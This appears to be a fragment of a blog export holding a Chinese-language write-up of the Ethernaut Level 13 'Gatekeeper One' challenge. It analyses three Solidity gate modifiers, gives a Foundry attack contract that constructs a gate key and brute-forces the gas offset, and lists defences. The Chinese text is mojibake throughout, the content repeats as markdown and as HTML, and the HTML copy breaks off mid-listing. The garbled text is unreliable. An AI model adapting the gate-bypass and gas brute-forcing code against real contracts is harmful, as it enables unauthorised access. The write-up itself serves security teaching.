ç¼–å†™ä¸€ä¸ªå¾ªç¯ï¼Œå°è¯•ä¸åŒçš„ `gas` å€¼æ¥è°ƒç”¨ `enter` å‡½æ•°ã€‚\n    *   åœ¨ `Foundry` æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ `try/catch` æ•è·å¤±è´¥çš„è°ƒç”¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæˆåŠŸçš„ `gas` å€¼ï¼ˆä¾‹å¦‚ï¼Œ`gas` åç§»é‡ä¸º `268`ï¼‰ã€‚\n4.  **å‘èµ·æ”»å‡»**: ä½¿ç”¨æ‰¾åˆ°çš„ `gas` å€¼å’Œæ„é€ çš„ `_gateKey` ä»æ”»å‡»åˆçº¦ä¸­è°ƒç”¨ `enter` å‡½æ•°ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…å¤æ‚çš„ `gas` æ£€æŸ¥**: `gasleft()` çš„å€¼æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¼šéšç€EVMçš„æ›´æ–°è€Œæ”¹å˜ã€‚ä¸åº”å°†å…¶ç”¨äºå…³é”®çš„è®¿é—®æ§åˆ¶é€»è¾‘ã€‚\n2.  **ç®€åŒ–ç±»å‹è½¬æ¢é€»è¾‘**: è¿‡äºå¤æ‚çš„ç±»å‹è½¬æ¢å’Œä½æ“ä½œä¼šä½¿ä»£ç éš¾ä»¥ç†è§£ï¼Œå¹¶å¯èƒ½å¼•å…¥æ„æƒ³ä¸åˆ°çš„æ¼æ´ã€‚åº”ä¿æŒé€»è¾‘æ¸…æ™°ã€ç›´æ¥ã€‚\n3.  **ä½¿ç”¨æ›´å®‰å…¨çš„è®¤è¯æ¨¡å¼**: ä¸è¦ä¾èµ– `tx.origin` æˆ– `gas` æŠ€å·§ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨æ•°å­—ç­¾åã€Merkleæ ‘æˆ–é¢„è¨€æœºç­‰æ›´å¼ºå¤§çš„éªŒè¯æœºåˆ¶ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **Foundry `try/catch`**: ç”¨äºåœ¨æµ‹è¯•ä¸­æ•è·å’Œå¤„ç†é¢„æœŸçš„ `revert`ï¼Œéå¸¸é€‚åˆæš´åŠ›ç ´è§£ `gas` ç­‰åœºæ™¯ã€‚\n-   **ä½æ“ä½œ (`|`, `&`)**: åœ¨æ„é€  `_gateKey` æ—¶ç”¨äºç²¾ç¡®æ§åˆ¶å­—èŠ‚å†…å®¹ã€‚\n-   **ç±»å‹è½¬æ¢**: æ·±å…¥ç†è§£Solidityä¸­ä¸åŒæ•´æ•°ç±»å‹ï¼ˆ`uint16`, `uint32`, `uint64`ï¼‰å’Œå­—èŠ‚ç±»å‹ï¼ˆ`bytes8`ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™è‡³å…³é‡è¦ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   `tx.origin` vs `msg.sender` çš„åŒºåˆ«æ˜¯è®¸å¤šåˆçº¦æ”»å‡»çš„åŸºç¡€ã€‚\n-   `gasleft()` çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œä¾èµ–å®ƒè¿›è¡ŒéªŒè¯æ˜¯è„†å¼±çš„ã€‚\n-   Solidityä¸­çš„ç±»å‹è½¬æ¢éµå¾ªä¸¥æ ¼çš„è§„åˆ™ï¼Œä¸æ­£ç¡®çš„è½¬æ¢æˆ–æˆªæ–­æ˜¯å¸¸è§çš„æ¼æ´æ¥æºã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸­é—´åˆçº¦ç»•è¿‡ `tx.origin` æ£€æŸ¥ã€‚\n-   é€šè¿‡æš´åŠ›ç ´è§£æ‰¾åˆ°æ»¡è¶³ `gasleft()` æ¨¡è¿ç®—çš„ `gas` å€¼ã€‚\n-   é€šè¿‡é€†å‘å·¥ç¨‹ç±»å‹è½¬æ¢å’Œä½æ“ä½œçš„ `require` æ¡ä»¶æ¥æ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸è¦å°† `gas` æ¶ˆè€—ä½œä¸ºå®‰å…¨æœºåˆ¶ã€‚\n-   ä¿æŒéªŒè¯é€»è¾‘çš„ç®€å•å’Œç›´æ¥ã€‚\n-   ä½¿ç”¨ç»è¿‡éªŒè¯çš„ã€æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯æ¨¡å¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity ç±»å‹è½¬æ¢](https://docs.soliditylang.org/en/latest/types.html#conversions)\n-   [tx.origin vs msg.sender](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)","source":"_posts/ethernaut-level-13-gatekeeper-one.md","raw":"---\ntitle: 'Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢'\ndate: 2025-01-25 16:10:00\nupdated: 2025-01-25 16:10:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Gas Manipulation\n  - Type Casting\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ EVMä¸­çš„Gasè®¡ç®—ã€ç±»å‹è½¬æ¢å’Œtx.originçš„å·§å¦™è¿ç”¨ï¼ŒæŒæ¡Gatekeeper Oneå…³å¡çš„ç ´è§£æŠ€å·§ã€‚ç†è§£modifierçš„ç»•è¿‡æ–¹æ³•å’Œgasleft()çš„ç‰¹æ€§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 13 - Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)  \n> **æ”»å‡»ç±»å‹**: Gasè®¡ç®— / ç±»å‹è½¬æ¢  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\né€šè¿‡ä¸‰ä¸ª `modifier` çš„æ£€æµ‹ï¼ŒæˆåŠŸè°ƒç”¨ `enter` å‡½æ•°ï¼Œæˆä¸º `entrant`ã€‚\n\n![Gatekeeper One Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ `enter(bytes8 _gateKey)` å‡½æ•°ï¼Œä½†å¿…é¡»ç»•è¿‡å®ƒçš„ä¸‰ä¸ª `modifier`ã€‚è®©æˆ‘ä»¬é€ä¸€åˆ†æã€‚\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` è¦æ±‚ `msg.sender` ä¸ç­‰äº `tx.origin`ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„æ£€æŸ¥ï¼Œç”¨äºé˜²æ­¢ç›´æ¥ä»å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ã€‚ä¸ºäº†ç»•è¿‡å®ƒï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ `enter` å‡½æ•°ã€‚è¿™æ ·ï¼Œ`tx.origin` å°†æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ï¼Œè€Œ `msg.sender` å°†æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ã€‚\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  require(gasleft() % 8191 == 0);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` è¦æ±‚åœ¨æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå‰©ä½™çš„ `gas` å¿…é¡»æ˜¯ `8191` çš„å€æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„çº¦æŸï¼Œå› ä¸º `gas` çš„æ¶ˆè€—ä¼šå› æ“ä½œç ã€Solidityç‰ˆæœ¬å’Œä¼˜åŒ–å™¨è®¾ç½®è€Œå¼‚ã€‚\n\næœ€ç›´æ¥çš„æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼šé€šè¿‡ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è°ƒç”¨ `enter` å‡½æ•°æ—¶å°è¯•ä¸åŒçš„ `gas` å€¼ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ `gasleft() % 8191 == 0` çš„å€¼ã€‚\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n  require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` å¯¹æˆ‘ä»¬ä¼ å…¥çš„ `_gateKey` (ä¸€ä¸ª `bytes8` ç±»å‹çš„å€¼) è¿›è¡Œäº†ä¸‰é¡¹æ£€æŸ¥ï¼š\n\n1.  `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`\n    *   `uint64(_gateKey)` å°† `bytes8` è½¬æ¢ä¸º `uint64`ã€‚\n    *   `uint32(...)` ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½32ä½ã€‚\n    *   `uint16(...)` ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½16ä½ã€‚\n    *   ä¸ºäº†è®©ä¸¤è€…ç›¸ç­‰ï¼Œ`_gateKey` çš„ç¬¬17ä½åˆ°ç¬¬32ä½å¿…é¡»å…¨ä¸º0ã€‚ä¾‹å¦‚ï¼Œ`0x????????0000????`ã€‚\n\n2.  `uint32(uint64(_gateKey)) != uint64(_gateKey)`\n    *   è¿™è¦æ±‚ `_gateKey` çš„é«˜32ä½ä¸å…¨ä¸º0ã€‚\n\n3.  `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`\n    *   `uint16(uint160(tx.origin))` è·å– `tx.origin` åœ°å€çš„æœ€ä½16ä½ã€‚\n    *   è¿™è¦æ±‚ `_gateKey` çš„ä½32ä½ï¼ˆç»è¿‡ç¬¬ä¸€æ¬¡æ£€æŸ¥åï¼Œå…¶å®å°±æ˜¯ä½16ä½ï¼‰å¿…é¡»ç­‰äº `tx.origin` çš„ä½16ä½ã€‚\n\nç»¼åˆè¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡º `_gateKey`ï¼š\n-   å°† `tx.origin` (å³æˆ‘ä»¬çš„EOAåœ°å€) çš„ä½16ä½ä½œä¸º `_gateKey` çš„ä½16ä½ã€‚\n-   ç¡®ä¿ `_gateKey` çš„17-32ä½ä¸º0ã€‚\n-   åœ¨ `_gateKey` çš„é«˜32ä½ä¸­è®¾ç½®è‡³å°‘ä¸€ä¸ªéé›¶ä½ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\nè¿™æ˜¯æˆ‘ä»¬çš„Foundryæµ‹è¯•åˆçº¦ï¼Œå®ƒå°†éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶è°ƒç”¨ `enter` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/13_GatekeeperOne.sol\";\n\ncontract GatekeeperOneTest is Test {\n    GatekeeperOne instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperOne();\n        attacker = new Attack(address(instance));\n    }\n\n    function testattacker() public {\n        vm.startPrank(player1, player1);\n        // ä½¿ç”¨è¯•é”™æ³•æ‰¾åˆ°åˆé€‚çš„gaså€¼ (ä¾‹å¦‚ 268)\n        attacker.attack(268);\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\ncontract Attack is Test {\n    GatekeeperOne instance;\n\n    constructor(address fb) {\n        instance = GatekeeperOne(fb);\n    }\n\n    // æ„é€  gateKey å¹¶ä½¿ç”¨æŒ‡å®šçš„ gas è°ƒç”¨ enter å‡½æ•°\n    function attack(uint256 gas) public {\n        // æ„é€ æ»¡è¶³ gateThree çš„ key\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n\n        // ä½¿ç”¨è®¡ç®—å¥½çš„ gas è°ƒç”¨ç›®æ ‡å‡½æ•°\n        instance.enter{gas: 8191 * 10 + gas}(gateKey);\n    }\n\n    // ç”¨äºæš´åŠ›ç ´è§£ gas å€¼çš„å‡½æ•°\n    function findGas() public {\n        uint16 origin_suffix = uint16(uint160(msg.sender));\n        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;\n        \n        for (uint256 i = 0; i < 8191; i++) {\n            try instance.enter{gas: 8191 * 10 + i}(gateKey) {\n                console.log(\"Found gas:\", i); // å®éªŒå¾—å‡º i = 268\n                return;\n            } catch {}\n        }\n        revert(\"No gas match found!\");\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **åˆ›å»ºæ”»å‡»åˆçº¦**: ç»•è¿‡ `gateOne` (`msg.sender != tx.origin`)ã€‚\n2.  **æ„é€  `_gateKey`**:\n    *   è·å– `tx.origin` çš„ä½16ä½ã€‚\n    *   å°†å…¶æ„é€ æˆä¸€ä¸ª `bytes8` å€¼ï¼Œæ»¡è¶³ `gateThree` çš„æ‰€æœ‰ `require` æ¡ä»¶ã€‚\n3.  **æš´åŠ›ç ´è§£ `gas`**:\n    *   ç¼–å†™ä¸€ä¸ªå¾ªç¯ï¼Œå°è¯•ä¸åŒçš„ `gas` å€¼æ¥è°ƒç”¨ `enter` å‡½æ•°ã€‚\n    *   åœ¨ `Foundry` æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ `try/catch` æ•è·å¤±è´¥çš„è°ƒç”¨ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæˆåŠŸçš„ `gas` å€¼ï¼ˆä¾‹å¦‚ï¼Œ`gas` åç§»é‡ä¸º `268`ï¼‰ã€‚\n4.  **å‘èµ·æ”»å‡»**: ä½¿ç”¨æ‰¾åˆ°çš„ `gas` å€¼å’Œæ„é€ çš„ `_gateKey` ä»æ”»å‡»åˆçº¦ä¸­è°ƒç”¨ `enter` å‡½æ•°ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…å¤æ‚çš„ `gas` æ£€æŸ¥**: `gasleft()` çš„å€¼æ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå¹¶ä¸”ä¼šéšç€EVMçš„æ›´æ–°è€Œæ”¹å˜ã€‚ä¸åº”å°†å…¶ç”¨äºå…³é”®çš„è®¿é—®æ§åˆ¶é€»è¾‘ã€‚\n2.  **ç®€åŒ–ç±»å‹è½¬æ¢é€»è¾‘**: è¿‡äºå¤æ‚çš„ç±»å‹è½¬æ¢å’Œä½æ“ä½œä¼šä½¿ä»£ç éš¾ä»¥ç†è§£ï¼Œå¹¶å¯èƒ½å¼•å…¥æ„æƒ³ä¸åˆ°çš„æ¼æ´ã€‚åº”ä¿æŒé€»è¾‘æ¸…æ™°ã€ç›´æ¥ã€‚\n3.  **ä½¿ç”¨æ›´å®‰å…¨çš„è®¤è¯æ¨¡å¼**: ä¸è¦ä¾èµ– `tx.origin` æˆ– `gas` æŠ€å·§ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨æ•°å­—ç­¾åã€Merkleæ ‘æˆ–é¢„è¨€æœºç­‰æ›´å¼ºå¤§çš„éªŒè¯æœºåˆ¶ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **Foundry `try/catch`**: ç”¨äºåœ¨æµ‹è¯•ä¸­æ•è·å’Œå¤„ç†é¢„æœŸçš„ `revert`ï¼Œéå¸¸é€‚åˆæš´åŠ›ç ´è§£ `gas` ç­‰åœºæ™¯ã€‚\n-   **ä½æ“ä½œ (`|`, `&`)**: åœ¨æ„é€  `_gateKey` æ—¶ç”¨äºç²¾ç¡®æ§åˆ¶å­—èŠ‚å†…å®¹ã€‚\n-   **ç±»å‹è½¬æ¢**: æ·±å…¥ç†è§£Solidityä¸­ä¸åŒæ•´æ•°ç±»å‹ï¼ˆ`uint16`, `uint32`, `uint64`ï¼‰å’Œå­—èŠ‚ç±»å‹ï¼ˆ`bytes8`ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™è‡³å…³é‡è¦ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   `tx.origin` vs `msg.sender` çš„åŒºåˆ«æ˜¯è®¸å¤šåˆçº¦æ”»å‡»çš„åŸºç¡€ã€‚\n-   `gasleft()` çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œä¾èµ–å®ƒè¿›è¡ŒéªŒè¯æ˜¯è„†å¼±çš„ã€‚\n-   Solidityä¸­çš„ç±»å‹è½¬æ¢éµå¾ªä¸¥æ ¼çš„è§„åˆ™ï¼Œä¸æ­£ç¡®çš„è½¬æ¢æˆ–æˆªæ–­æ˜¯å¸¸è§çš„æ¼æ´æ¥æºã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡ä¸­é—´åˆçº¦ç»•è¿‡ `tx.origin` æ£€æŸ¥ã€‚\n-   é€šè¿‡æš´åŠ›ç ´è§£æ‰¾åˆ°æ»¡è¶³ `gasleft()` æ¨¡è¿ç®—çš„ `gas` å€¼ã€‚\n-   é€šè¿‡é€†å‘å·¥ç¨‹ç±»å‹è½¬æ¢å’Œä½æ“ä½œçš„ `require` æ¡ä»¶æ¥æ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸è¦å°† `gas` æ¶ˆè€—ä½œä¸ºå®‰å…¨æœºåˆ¶ã€‚\n-   ä¿æŒéªŒè¯é€»è¾‘çš„ç®€å•å’Œç›´æ¥ã€‚\n-   ä½¿ç”¨ç»è¿‡éªŒè¯çš„ã€æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯æ¨¡å¼ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity ç±»å‹è½¬æ¢](https://docs.soliditylang.org/en/latest/types.html#conversions)\n-   [tx.origin vs msg.sender](https://solidity-by-example.org/hacks/phishing-with-tx-origin/)","slug":"ethernaut-level-13-gatekeeper-one","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpc0011bf5qg9jedx7i","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-13-Gatekeeper-One-Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\"><a href=\"#ğŸ¯-Ethernaut-Level-13-Gatekeeper-One-Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢\"></a>ğŸ¯ Ethernaut Level 13: Gatekeeper One - Gasè®¡ç®—ä¸ç±»å‹è½¬æ¢</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/13\">Ethernaut Level 13 - Gatekeeper One</a><br><strong>æ”»å‡»ç±»å‹</strong>: Gasè®¡ç®— &#x2F; ç±»å‹è½¬æ¢<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>é€šè¿‡ä¸‰ä¸ª <code>modifier</code> çš„æ£€æµ‹ï¼ŒæˆåŠŸè°ƒç”¨ <code>enter</code> å‡½æ•°ï¼Œæˆä¸º <code>entrant</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg\" alt=\"Gatekeeper One Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ <code>enter(bytes8 _gateKey)</code> å‡½æ•°ï¼Œä½†å¿…é¡»ç»•è¿‡å®ƒçš„ä¸‰ä¸ª <code>modifier</code>ã€‚è®©æˆ‘ä»¬é€ä¸€åˆ†æã€‚</p>\n<h3 id=\"Modifier-1-gateOne\"><a href=\"#Modifier-1-gateOne\" class=\"headerlink\" title=\"Modifier 1: gateOne\"></a>Modifier 1: <code>gateOne</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateOne() &#123;</span><br><span class=\"line\">  require(msg.sender != tx.origin);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> è¦æ±‚ <code>msg.sender</code> ä¸ç­‰äº <code>tx.origin</code>ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„æ£€æŸ¥ï¼Œç”¨äºé˜²æ­¢ç›´æ¥ä»å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ã€‚ä¸ºäº†ç»•è¿‡å®ƒï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚è¿™æ ·ï¼Œ<code>tx.origin</code> å°†æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ï¼Œè€Œ <code>msg.sender</code> å°†æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ã€‚</p>\n<h3 id=\"Modifier-2-gateTwo\"><a href=\"#Modifier-2-gateTwo\" class=\"headerlink\" title=\"Modifier 2: gateTwo\"></a>Modifier 2: <code>gateTwo</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateTwo() &#123;</span><br><span class=\"line\">  require(gasleft() % 8191 == 0);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> è¦æ±‚åœ¨æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå‰©ä½™çš„ <code>gas</code> å¿…é¡»æ˜¯ <code>8191</code> çš„å€æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„çº¦æŸï¼Œå› ä¸º <code>gas</code> çš„æ¶ˆè€—ä¼šå› æ“ä½œç ã€Solidityç‰ˆæœ¬å’Œä¼˜åŒ–å™¨è®¾ç½®è€Œå¼‚ã€‚</p>\n<p>æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼šé€šè¿‡ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨è°ƒç”¨ <code>enter</code> å‡½æ•°æ—¶å°è¯•ä¸åŒçš„ <code>gas</code> å€¼ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³ <code>gasleft() % 8191 == 0</code> çš„å€¼ã€‚</p>\n<h3 id=\"Modifier-3-gateThree\"><a href=\"#Modifier-3-gateThree\" class=\"headerlink\" title=\"Modifier 3: gateThree\"></a>Modifier 3: <code>gateThree</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class=\"line\">  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class=\"line\">  _;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ª <code>modifier</code> å¯¹æˆ‘ä»¬ä¼ å…¥çš„ <code>_gateKey</code> (ä¸€ä¸ª <code>bytes8</code> ç±»å‹çš„å€¼) è¿›è¡Œäº†ä¸‰é¡¹æ£€æŸ¥ï¼š</p>\n<ol>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code></p>\n<ul>\n<li><code>uint64(_gateKey)</code> å°† <code>bytes8</code> è½¬æ¢ä¸º <code>uint64</code>ã€‚</li>\n<li><code>uint32(...)</code> ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½32ä½ã€‚</li>\n<li><code>uint16(...)</code> ä¼šæˆªæ–­ï¼Œåªä¿ç•™ä½16ä½ã€‚</li>\n<li>ä¸ºäº†è®©ä¸¤è€…ç›¸ç­‰ï¼Œ<code>_gateKey</code> çš„ç¬¬17ä½åˆ°ç¬¬32ä½å¿…é¡»å…¨ä¸º0ã€‚ä¾‹å¦‚ï¼Œ<code>0x????????0000????</code>ã€‚</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>\n<ul>\n<li>è¿™è¦æ±‚ <code>_gateKey</code> çš„é«˜32ä½ä¸å…¨ä¸º0ã€‚</li>\n</ul>\n</li>\n<li><p><code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</code></p>\n<ul>\n<li><code>uint16(uint160(tx.origin))</code> è·å– <code>tx.origin</code> åœ°å€çš„æœ€ä½16ä½ã€‚</li>\n<li>è¿™è¦æ±‚ <code>_gateKey</code> çš„ä½32ä½ï¼ˆç»è¿‡ç¬¬ä¸€æ¬¡æ£€æŸ¥åï¼Œå…¶å®å°±æ˜¯ä½16ä½ï¼‰å¿…é¡»ç­‰äº <code>tx.origin</code> çš„ä½16ä½ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>ç»¼åˆè¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡º <code>_gateKey</code>ï¼š</p>\n<ul>\n<li>å°† <code>tx.origin</code> (å³æˆ‘ä»¬çš„EOAåœ°å€) çš„ä½16ä½ä½œä¸º <code>_gateKey</code> çš„ä½16ä½ã€‚</li>\n<li>ç¡®ä¿ <code>_gateKey</code> çš„17-32ä½ä¸º0ã€‚</li>\n<li>åœ¨ <code>_gateKey</code> çš„é«˜32ä½ä¸­è®¾ç½®è‡³å°‘ä¸€ä¸ªéé›¶ä½ã€‚</li>\n</ul>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>è¿™æ˜¯æˆ‘ä»¬çš„Foundryæµ‹è¯•åˆçº¦ï¼Œå®ƒå°†éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶è°ƒç”¨ <code>enter</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span 